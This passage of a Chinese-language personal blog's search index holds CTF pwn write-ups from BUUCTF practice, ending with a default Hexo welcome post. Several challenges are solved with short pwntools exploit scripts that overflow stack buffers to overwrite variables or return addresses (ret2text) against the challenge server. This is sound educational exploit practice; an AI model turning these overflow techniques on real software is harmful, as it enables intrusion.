enabled<br></code></pre></td></tr></table></figure><p>IDA32打开(终于有32位的文件了QAQ)啊嘞，虽然保护开的吓人，但是这代码审计不难，大概就是让var[13]等于17就成功了::</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129170823918.png" alt="image-20230129170823918"></p><p>由于一开始就有让我们输入name，所以只需要将var数组里全填上17就可通过判断了:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25940</span>)<br><br>payload = p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span><br><br>p.sendline(payload)<br><br>p.<span class="hljs-built_in">int</span>eractive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn题第一天</title>
    <link href="/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <url>/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>拿到题不管三七二十一先check一下，64位文件，无保护:</p><img src="/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/1.png" class width="1"><p>丢进ida64里，看汇编还是有点费劲，选择F5看伪C代码：</p><p><img src="/2.png" alt="图片2"></p><p>很容易看到第11行的gets，很明显的栈溢出。shift+f12又发现了cat flag.txt：</p><p><img src="/3.jpg" alt="图片3"></p><p>那局势就很明了了，标准的ret2text，双击进去，Ctrl+x发现在sub_40060D中调用了此字符串：</p><p><img src="/4.png" alt="图片4"></p><p>回到main函数看一下v5的长度：</p><p><img src="/5.png" alt="图片5"></p><p>万事俱全,exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28016</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + p64(<span class="hljs-number">0x40060D</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>同样check,64位，只开了NX保护:</p><p><img src="/6.png" alt="图片6"></p><p>主函数平平无奇，调用了一个func()函数，进去看看:</p><p><img src="/7.png" alt="图片7"></p><p><img src="/8.png" alt="图片8"></p><p>代码审计，发现当v2&#x3D;11.28125时能拿到flag。我们用gets输入的是v1，只需要控制v1的长度，是v1溢出给v2填充为11.28125即可。不过要注意，这里的11.28125需要是16进制的。</p><p>附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29450</span>) <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x41348000</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>check，32位，只开了NX保护:</p><p><img src="/9.png" alt="图片9"></p><p>可以看到第12行的fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，代码审计后发现，会把字符’I’变成’you’：</p><p><img src="/10.png" alt="图片10"></p><p>shell地址也直接给了我们:</p><p><img src="/11.png" alt="图片11"></p><p>附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26413</span>)<br><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span> * <span class="hljs-number">21</span> + <span class="hljs-string">b&#x27;a&#x27;</span> + p32(<span class="hljs-number">0x8048f0D</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>假期有点懒散，考完试摆了快一个星期了QAQ，最近实验室安排了才开始学，好多都忘了。第一天就写 三道ret2text叭，之后要加加油了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/08/hello-world/"/>
    <url>/2023/01/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
